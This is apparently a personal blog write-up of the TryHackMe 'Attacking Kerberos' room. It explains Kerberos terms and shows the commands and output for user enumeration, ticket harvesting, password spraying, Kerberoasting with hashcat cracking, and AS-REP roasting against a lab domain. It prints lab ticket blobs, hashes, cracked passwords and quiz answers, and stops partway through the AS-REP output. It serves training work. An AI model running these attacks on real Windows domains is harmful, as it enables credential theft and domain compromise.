---
title: Attacking Kerberos
date: 2022-06-20 18:32:00 -0500
categories: [Lesson, Tryhackme]
tags: [kerberos, windows]
---

Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller

<https://tryhackme.com/room/attackingkerberos>

![0xskar](/assets/kerberos01.png)

* * *

## Task 1 - Introduction 

**This room will cover:**

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

**Notes:**

- Kerberos is the default authentication service for Windows domains.
- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

##  Kerberos Authentication Overview

![0xskar](/assets/kerberos02.png)

- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
- AP-REP - 6.) The service grants access

##   Answer the questions below

**What does TGT stand for?**

- Ticket Granting Ticket

**What does SPN stand for?**

- Service Principal Name

**What does PAC stand for?**

- Privilege attribute certificate

**What two services make up the KDC?**

- AS, TGS

* * * 

## Task 2 - Enumeration w/ Kerbrute 

![0xskar](/assets/kerberos03.png)

sudo /opt/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

```shell
┌──(0xskar㉿cocokali)-[~/thm/attackingkerberos]
└─$ sudo /opt/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/22 - Ronnie Flathers @ropnop

2022/06/20 11:46:28 >  Using KDC(s):
2022/06/20 11:46:28 >   CONTROLLER.local:88

2022/06/20 11:46:28 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2022/06/20 11:46:29 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2022/06/20 11:46:29 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2022/06/20 11:46:30 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2022/06/20 11:46:30 >  Done! Tested 100 usernames (10 valid) in 1.887 seconds
```

##   Answer the questions below

**How many total users do we enumerate?**

- 10

**What is the SQL service account name?**

- sqlservice

**What is the second "machine" account name?**

- machine2

**What is the third "user" account name?**

- user3

* * * 

## Task 3 - Harvesting & Brute-Forcing Tickets w/ Rubeus 

##  Harvesting Tickets w/ Rubeus 

1. Have Rubeus Comlined and on the target machine
2. ``cd Downloads`` - Navigate to the directory 
3. ``Rubeus.exe harvest /interval:30`` - Tells rubeus to harvest for TGTs every 30 seconds

```shell
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                                   
   _____) )_   _| |__  _____ _   _  ___               
  |  __  /| | | |  _ \| ___ | | | |/___)              
  | |  \ \| |_| | |_) ) ____| |_| |___ |              
  |_|   |_|____/|____/|_____)____/(___/               
                                                      
  v1.5.0                                              
                                                      
[*] Action: TGT Harvesting (with auto-renewal)        
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (6/20/2022 11:51:18 AM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  6/20/2022 11:26:37 AM                                                         
  EndTime               :  6/20/2022 9:26:37 PM                                                          
  RenewTill             :  6/27/2022 11:26:37 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjTlK3cJIXALbz0AP/5+JKkMuwRXYj9pEwsw 
    wBWjxBRQTVgXRL90hT/Et+ePfbnscez3dkP5avarW2I3WuQpsmU5dhtUzzeuZUpOl2AnKLuHXGUylOsLoaM2HTwNCzJIs/j3HGPL 
    LSIo/HI/w0P5sBX/BLhHRUt85OUo267foX40cFNJSmsAo9qRWAGrmiryv+scgGjXH/ZoF1AbFJowu+/3BtZrxN8PAEgNYbwLS2qm 
    rCPdBnQs5u9w66+uLhvY2cXKPUAW5vpUWGkdSm7eXhHlNwyQ5ecOtUICJag2++dO9mWhYz38PpqXIZjI7cAF5skaluWY+cFGt0OB 
    qwgV/UbN/6AMkh3eZFbbvtLV05jPdEVZnQ7BuNftd/4NZWEHCjvv7efWCgkIJ7SsWbboGqwiCg3PeXlPS3O2Rn44pIRxpvsyhT4+ 
    EGaipgcu51o+FPTRY/YwLTqHj50fUHIPMH0IgRASs+Ko9iMyOF1Eac2C7hNHu8zRwn3cUhVWY97ZKKM4lEj5kRfeMhddYJFrb8yU 
    nLY9jHEYAw4Cf87zd5X1Dfa4V16nujxdzztHgMeEnaUCLPgPEWHlCuszYCYRyJ4IvQaprUsVfsNnmIIjzvzWAX5gVuBgvCPxBr7F 
    nO/3s0ejL5Nssp8aKrHUgOqY2u3tYEjZ1oMiL0Pbh0/y8kEF1aeQ6oVyBe96zAFRS8OWK/eWA44mhBAQaQ1bHaZXUc1a0R8D9eWC 
    28vqqkPfX4JAt4uM3XGqlAvysFdqz4fY/wCkXuCcHkUGSTzzUK+dtYYymezQzDcgWhnikVKDUbU6PzvtReEXAe2G2QEwpmaUSn9u 
    AzZniEfBWwaKDnbmCr7a3LTLogo4dLX98DvtDnC9cjBGNqMRVaz0z43+OvM+hRCeh1HDVR2fdxlUf8GvP/robPFHpGtLfI4KD2yE 
    YnGLmpixqHEraw03TavjmGGi17pHV3rGMrUb+IC7JdUPg2ls3s2qwOIW19d63M8lDbccTHhuJQ0kLpJfs/II5MtufAI3qU83DfX+ 
    x+S5psT5YfYOWI42NGDyntaPISGepKKwY3CT1hIhAt3agUv5wjFyMd0BY1G1PyhvW6vX9IW5fVJqhwUujZYPz7/PchFgQz7k7JtF 
    DXlPzn4dsTCB9a1z7eMtD9mdAAvIPubu/Z69TsscfNxGSHwn6uiCWv11cJdGhT759gfqBY4unjBVelqjUSK0Qv9nfw88VhDLgSg5 
    Q8cBMvXyVxMxvlJTXLw+SNApqsF4zzCjgr+LuRb146geUI27I0bXPFcsr9k13ihH2L6nlExKaQiBBmvAeu26BxtCicpLCEKOZ+Os 
    lv5Ee6yhZWoO8qpwod9Mi/k5QLugXOb9ghs9s6zBju6FH9CALMNcYVSjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr 
    MCmgAwIBEqEiBCDrTZoy9U6bFkbBujbFgP0FP9Jh6LXAxX2YEgg75PW4PqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw 
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDYyMDE4MjYzN1qmERgPMjAyMjA2MjEwNDI2MzdapxEYDzIwMjIwNjI3 
    MTgyNjM3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM 

  User                  :  Administrator@CONTROLLER.LOCAL                                                
  StartTime             :  6/20/2022 11:48:58 AM                                                         
  EndTime               :  6/20/2022 9:48:58 PM                                                          
  RenewTill             :  6/27/2022 11:48:58 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjJica1+uKqjFMSztPTcnK4EqCpqClW2I6ZU
    fJmjMzWtKQopVktGvROpJNuKuMX1SxU7A+NZuRpF5NfFHrj5Y1qxXJrCTHcgcfL7NOA4nAnrElPLcyufXGP87HpZsJpagqW99cAi
    +XqSXOomtZYyJNIZlkeSvi+Ug8OXKE0EGKngU7BR5x927akYWKgAiOPy7l11/Gjp2qcPt3u2ut6Ik2DFYDIeKAVsPYf4i1/uuV7f
    MgjlzODyBo1m3/73KMW2nBhDWzgokegvVXOSbHc8Umx4+wE/osEZD41V2yivgVGR/OE1HmlXdnt6pmm5pN7W063uHRCoJaj711T5
    Cy1vZlOEnBtqIsG89fxYv/Y4bjVtDwIyk9jugEr3hh9tsmCOmDUvXlw00LQvfUxPxWyYEmTzsvBQ+AEA15lW9LeaJ+OlWtLWM1wc
    q9whjptAwHOnTZM+X1CNII0Cy5l5FjZ349XsfX0EHgsiVvUnc/TafRE047fy2cVnthJL9nqqjDJsWa1WKkqot8ic4Mi1cgjqHEES
    HH5EcnP9B+7R0L/FPUv/q9FeKqlaObRCbO0g7RGaTOZ6OSG/G/VdnS5ynCBprySLpbmLCcGumsdZvGuE7HIO9E1u+/6tMTtZ6z9u
    AVXF+P4mE4yTSKz3x/wQZfp5nlthsXfGTMpVxM9dnc3OHbBDBMT5PcQsswWL6b7P8awH5JY8Mmz4Yz6sb3i6ERMG5RJ3gF7AcWRx
    n31pTP66iICPUuJW02cKbretMGA7WKvTCHmCu33SYFJWpiJH/Iq1rw21rDCIXgFzsQJTFZSE437SvvttbB9tU7X9h4mmW34zMiu6
    yK/0qJ4ULA+1A8IwN6MduyL7akEbP+p+EUpPbjCe2YV/OQrOwwXl7SoSC9cV+r4sc6j2dRAsVE0oYHkWYsmtBFle6hk/dg1/fAcE
    8iDmBlShWafPHgMlv7PETiAyqhffsb172RD0q9x4sOtwo4inf2tqKQj+SH7DXzIY1xpVcbYqhAKTOEfzF0mU08cIlY2XEeKy40HD
    t5KtbMzmvqfQBhB3iCRqhvwZlRsjvz4NusRt29B+0qXipHeaRUOURzjnICLye5Y9gr/emjWxxA3KqV0rXDXLMFMJnJrs1R2pU0Fr
    7OVnGWw0D38VqCQqF0bLk4KYAShax0yQjjzPqCtBY80lw8Cz8utpvVT4/lFD5y8Ll39Ih3r0XShVjhgRsgDxcSHauxisvmGzujeC
    7EXN1KHB0q908DeVxCUb5ZyKKM3lovOU2KvjWi3+0eUUh4ygN0RRO3XfxRN5SRXhDRqd2vvU+W3cT+Ja7ysd9JXxRMfxtEasj8TB
    aspkcPndgdTmkymBVnhpQYP8vq575JPdi6ubwbih+qSHOxe0Q/q+fAyPI4Fn31dL6KOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIC5U5R1rNWqxS6JJvQAVLtJLsd9U1zkREEuSTD8h1esjoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNjIwMTg0ODU4WqYRGA8yMDIyMDYyMTA0NDg1OFqnERgP
    MjAyMjA2MjcxODQ4NThaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

```

##  Brute-Forcing / Password-Spraying w/ Rubeus

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

1. ``echo 10.10.146.3 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts``
2. Nagivate to Rubueus directory ``C:\Users\Administrator\Downloads``
3. ``Rubeus.exe brute /password:Password1 /noticket``

```shell
   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7Ve4Z+Wg7BgJBd6uHv1PGR0zSbVeyLeyGk9Rz3JdAvvC6/UeT3Mv/KJOKaReqD2Ek/FJ1kCMkEQC
      FPrKW7ECUycLrL3Lo23V90o+afUSH3nyjYIu7ia3OeRwKIJBRB8b48/MpljBfs1pWPXAqu2Jn9v8V7O1
      EOA9p5nAnZqgXUUe2KfwV8whhoP2TJ6Nl2in/I+jEu3GW50UoBzMfRnVJ6XYzhUs/Dckobdg98+8UfJA
      Drvn4RKaUKUqC+YW5trSXikF5pkM0/jitFAv7bL36qNudbbTVuP/xGAeSmY7N278s3Q2JNd0y4RKVWo5
      8fvdPUObJin9cIPgzwKADQ3p2qPO9Qx83V3gWx7NMFhM+cMvhdSHJKLhEbqORqaZpFGDsz76T0tgfZMz
      bNCzQI4oOdLfpBBmib1irHdPXJ8At1REl3D72ns+Ljp6BPlW7hsKLOJRQfEgnl4uZbDgpaKUc1EDsbPR
      rr2XonyGhROOez8F1WNa6k103gicRPuncuQ9uxnHnMi1tmre3pJygYDG8XYrxU75ULqTUnlwXLRgv0Q3
      hPgx5BxLv0if/FgsgGt7d3N9ifVs7k+0f0Ot+y3yVn/kqwgEckIFGD7rq7VzLjc1M/nUTM8YFMMk0XPz
      t8k7yuTjZamNJ5T+QFlAGq1QEky0MBIv6Rw5LBSVSyp6mLXKAciRsaYZxSwfmQMtTQvpzsxA8DrN6ctH
      R4WP40FhtP1HyxglxWvP5EkX+yYG1ub1lEiyTE0Oj2faGSH1jEQ4ME2H4fYeyPuHYCwZRPydYJcWOVqd
      SAMV8gbxTkiVs+nEtuVkCeh/8hqM7XHjNOyYgw7TKNcw5REvBnlnijSpMxai6ovF9jQF2mYjTpEGAHDG
      deCCGEyub3dTjoSmMxCGXvsNAdIVlMx36+EgTzcWBv1mo1nJ8Oj2mLQCeHQlYMWNKTkjo/S4F+i2yEP7
      fYpWx/2qGWymXOhXtvrn6HTGJ2jC8B1ShyCxpzpR7aYz1wj/NIIoYv/ch3K33AGe6vTlaFoR/pWQNj1W
      +uhof3qB5T4eP2jjiarXsmgqMKpvDebWmwCAMIK1nrkEv19S6/o+Quv/D5+3pv2VWz/XHjkbzFLjVm0M
      2ScYtgAMxqACLQWbZSdIW6YrfJL0o3BBQDIRBABfaT9CTwMAkfzMyIDIvo/2LswkGIjnkGy+UQkxv71e
      pirudE+ryy3i+bxpYfDR3M1yEXlsP2GwN/aSEJVWdP0T1jje778x1KyJGVT4wcVb+ruGlGSbC1+QXqAn
      iq06kEXPW4Q5sVdn90VW/45K8moA3S/wABp4gfBDU7h4gSHw28gYmCMX6LruWIQmF6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKqFLPWCNf605+d6eE9fmtjErMl9YpxQCLLP
      guIJRP88oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIyMDYyMTA2MDI0OFqmERgPMjAyMjA2MjExNjAyNDhapxEYDzIwMjIwNjI4MDYwMjQ4WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
````

##   Answer the questions below

**Which domain admin do we get a ticket for when harvesting tickets?**

- Administrator

**Which domain controller do we get a ticket for when harvesting tickets?**

- CONTROLLER-1

* * * 

## Task 4 - Kerberoasting w/ Rubeus & Impacket 

**Notes**: Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts use a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

1. ``cd Downloads`` Navigate to Rubeus
2. ``Rubeus.exe kerberoast``

```shell
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT 
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$10A48FD8265244A42C55AAF85088EED4$A13B7B72640901518F581A4C4AB94B7368F87D 
                             0C058111140CA3D660DBF8627C663B8E912011CB8BA31195E02B29F155C119AE917515C5604AA2EA
                             0C4FF99CFB84846ED1245F0A03116B7D340EAD8BFC16D9910CE62D2D3F47ED68F7DDB9953C29DBA7
                             80F454583177670BC4BF74D2D53E8437C2D1B4B06A495612FFB51BFB113A7763279FEFFC9BE7013D
                             647D990870219728E7C7A4E02204F7A56021D8549339AAA7AD8690715723C6B8E3C0C9B69B072047
                             362FB698E4335F337DEB25188FB653806AD1F2B922609E044F3E9419B2376386F176F52443A0A2DE
                             63254CE97A89634CA1B4F378E1CEEBD8CC33DBC4A0A8F98EB7702A4CAB7B3B2803980DF8B2BD5966
                             CB21FAB6E1676D964C6BBF36FDC63A70C086660E54080F5E9DDC04B5B626828CD25D157010470BE4
                             8AE842682BAD516E2ED6205057ACC859C9B10867B238A44EB03DBB0DEA5DC599944AF6799C90FD23
                             2A9E5C16C701CAE4F25039F463534361ABCA3EE3ADE22CFDB78A6553687B4038C3F089D02CA2688B
                             AEF8754D915E89A500FEA80CAE2CBB5FA2579D1F47E3211FFAD40E6D7B28D26B544C4FC8E2480845
                             2BA8AD332CE39EA255D101CA976416B909DBA8B7B3055C30B48711CD1960DA3A7B577CE261C33CC9
                             B044555C90B2D7CBD720231B2457468CFDEC7245459897F973F04B705F1E3C08B3869F9EA48B3485
                             B13836DB924FD94900BC01F627FE302A2403F666D2995C7C33F2BB5808EE8F7A41B452D9A57015E6
                             4BE7196D3964D0856C4791949DEF76C07F170D89071089D8DB7C8AD964DAE51351D89DE0117763C8
                             2F4167B3399B9FC9CD60CE6E4FD41F0972B01C59D733EB20749A3140A59DAD984DB93DA65412484D
                             B8D4F280F32525C74DA76C7E2C85A65806F9D5F65573432F38CB81D89C568C83EFB0222F224C30BA
                             027D2C632C3E2EA17F40AF31610FD05C48DA5A194E53C84D164D82DFADABD2FFE962C2FED4A284CA
                             C1D3DB4438DF370B77941F16383D5905995FF6EE75392694EE643A91B40E788D55FE49B5F42558A7
                             E28A7DDFFF164FAE752DFE5C6716CD622E7153EA07EDD9257B90FF648909DCBAEB096064D648CB2C
                             A40A821A29F431A78AA1527A26906EAA8FECB5DCD0F1F95194E286609E885970214BC5A3E8DA93F3
                             B918C8696F47F2A09C98F2045398005D92550BB526187E6FFAEB0F99E116C8739B0418661CE11900
                             AD1ABBC4B14578A88C5B1226D445721EEDFD9E2E40059F39EA9E909983153A93840DDC51812C6088
                             169BA4E337085E14F19992222BF38BFD6952E2A01698E0906A609B6C621F6C3198ACA5316110A601
                             D0A5964EDE76035806C8407A5631C604C1A1CEF151703E6B5AB88E09F92910B2ABDAB2A7808658A8
                             2B82904E0652DB118E7AD3129118267AB9B1784BE037104A1D70A70516B25F6EBB2E2DF3C1BDF092
                             34A92B0C87F89BBB965F6B33EA95A67A5B2D6035501F06635C4821D29F898037E4EDA1550E78635A
                             DC9C948639C9F044F8307F75145F97803CDFCC84195DBF45A5376D468663ADD530468BDC0CC71CFD
                             D4C44C8DC85A12BBBCA682BCF7B304D4C2DB233956BEA3629449624B08D238BC2E736DBBEDAF22F3
                             3266D49778BA77C241D6212D6D4A602F85E588B1ED7B6819E2357503CA

[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$00C460FCBDD8532B7A0F9A502A8585D5$35422C64B1A19B32A355E15A3885F68AE2BC
                             90C7D58777399857F9622E5B599780C023170A603247E6B41787566631B54D35CE7256E1A5F1710E
                             01E02C5513418542B610EEB27376ABD99728090A24F31CFE740831DD9A6E0DC7E802F12633719385
                             7C37A368CE01CBE6BAD9B50462051CABC5D5C107E2F91962DA80CC9C9F3E7864E3E75DA132E0AF88
                             DD7FF006DFB8C060CED59521371801EFEF511D54D3252C5D286593ADB05EEF1B02C2084D4EA14C4D
                             B7451E23660554DF737207676EC1870B93F11C3C357B1F392FE79950DD506DD3885C5339589C6577
                             980D4AF584EF2B1434ABFE99018E469BD286D9F8BC97DC3DF1C12D04D74BA7D1392C1E8F343F5A16
                             3602BD0F3D55C99D9CF443CE9FA4D9CDF18B7380B1C30388F5E78DFFF8AB42F7B8021A3C00DCA85A
                             31E867D6FEB8AAFBB7CA8AEFE6E2680C3450E0AA0C6296917A7F6062C8243468EF9BAD39465DB1CD
                             FC01DFD834B576B39FC6EE5616E3236C3FF7BFFAEC994B9A1C67C8609441C70B113537851A7B7F41
                             A74AB572C1FE6AFA8BE01B7F744C8FCD895AD375569BA03C643D0680D52FE96416EBE8DE675C9064
                             DDED71F31E527486BF396866CBF1EE1F1C2D6000CC54808D338A9D569DC448FDFD42B3355B3DE33E
                             745D885DFAFF6C917E6284AE1B14C14BAAD4680C8D52833D876A9EBC918A4E1092CD8138670E63AC
                             B725F21A9D96AC87604432F995DB88CF2047A6128B076591A12927D9F49AECA0B0C03F401D6B49A0
                             3F7B02617344E614A28A2B259871AE53022941741B4C2E55BFBF7F623BFF56216C8420FA4B3281EC
                             665D6AA5219C2D57BE48C82F2FFC89AFAE2C0068CB7804BF17F20BF658BA39D121C09D046C947278
                             A797A85573B254AE3E7A2B81675B4589E4FB9C5F1051D9A2A6673B7B97C566E7BFF717CEF524CD83
                             49CA06957A5B686FF426C6AC6B88FAD6CC6A3454920AD7A45EF38E216ECA8E6C01D9E80DED26DA32
                             4E3E422D187393ED2DC18F1BBE516C545F32B5770550351DF19C31FFDB9BC02D33AD41C9B61ED501
                             AD4F5BACC5CE933B7899EA55E08E2098FA2186FC1E9D26076F64A7C14E0A91419F2B4956C21EC9D1
                             7D354B22CDB3B593130BC7C1F49BE88560581EBF425A12F8AA096D11FEAF94D3522D89E83DE7AD31
                             BB4A017D5720155EE8BA88BB9FF4677981FD0AB1EA54E2F67385A240E87A5BA72BD6608C00C7D6E4
                             F3BBC571120DED4A041E59C30514C78D7BB80095496D3E60B5BCF5F99767FB3BB57705EE47FFC79C
                             E7F1D3858CFEB705B28C4D065466FBD70B8A6223CF82023E7BD68FC71896F4C0F38D43020C8603E6
                             7AA33F23F60C60A698B5539089034B227127F58B724DA9A92174AF93673328E27893DBB7784652FA
                             4AFAA2CDCD14299854DD0073669E4848F8C6BDDA2C423FD98924555A5C76A7FC341BF35441EBF4DD
                             F40CFE0709B01F172883BA056EAF9DA6526CCBF3C9E6E893B229ECE0A52A40E18668B25DD025054F
                             F7F2DA40506169AA16B837F25C4C3F66DA7782A92FA59764350BCD1701961D0417875FB673B85770
                             4D945026C5D8B07CE289819EC927AFE786DA4DCD03BFD3688B1E2951D6BB9D13189B9D794F88ED68
                             A5CFDA860792FD590B334BF24A6EE0083DFD88640F349C0DD5A81A8092A9
````

**What is the HTTPService Password?**

- ``hashcat -m 13100 -a 0 httpservicehash.txt Pass.txt``
- Summer2020

**What is the SQLService Password?**

- ``hashcat -m 13100 -a 0 sqlservicehash.txt Pass.txt``
- MYPassword123#

* * * 

## Task 5 - AS-REP Roasting w/ Rubeus 

- AS_REP Roasting dumps the krbasrep5 hashes of users that have Kerberos pre-auth disabled. 
- Rubeus has a simple and easy to understan comming to AS-REP roast and attack users with pre-auth disabled. 
- After dumping hash from Rubneus we use hashcat in order to crack the krbasrep5 hash
- Others tools we can use such as kekeo and Impacket's GetNPUsers.py. Rubeus is easiar to use because it automaticalld finds AS-REP Roastable users where with GETNPUsers you have to enumerate the users beforehand and know which users are AS-REP Roastable.

##  AS-REP Roasting Overview

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

![0xskar](/assets/kerberos04.png)

##  Dumping KRBASREP5 Hashes w/ RUBEUS

1. ``cd Downloads`` - nagivate to Rubeus
2. ``Rubeus.exe asreproast`` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

```shell
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::edde:c433:95ab:1b34%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:F1DD06F612FDEF33DEED86E4BE4F1FBF$25CB8CBC1693
      7A5BB84C798B8920C37496A0762C288524FB8A324370C07A5142C648FC8102A1E7D545F2DBD978C6
      F52DD66A1796AD678C2156C4165124C3EB334E7E6CD7F7A85F3FDE6985ECD71941BDA9034F65BC1A
      3D4A332FF012DBBB6A4D68715991ED2F10373B625A0DEBF17AD9A6960E2EE8223D09A89963CD257A
      6C48077E8F1A9D7EEA81F4D96676CC9B1F9332CC54A647CF76E94A56B2636ECC6FD34332683C2EB4
      E57271D0002742864EFE00D1BF87A20A7AE10C7EDF004C68A68A89F280B2563454231BC99E6D5261
      9E2BD0C3F72BBC9A7F50611D742A9FC4C53E7811F737057523098A9C418ABCFC17DD778E3CD3

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
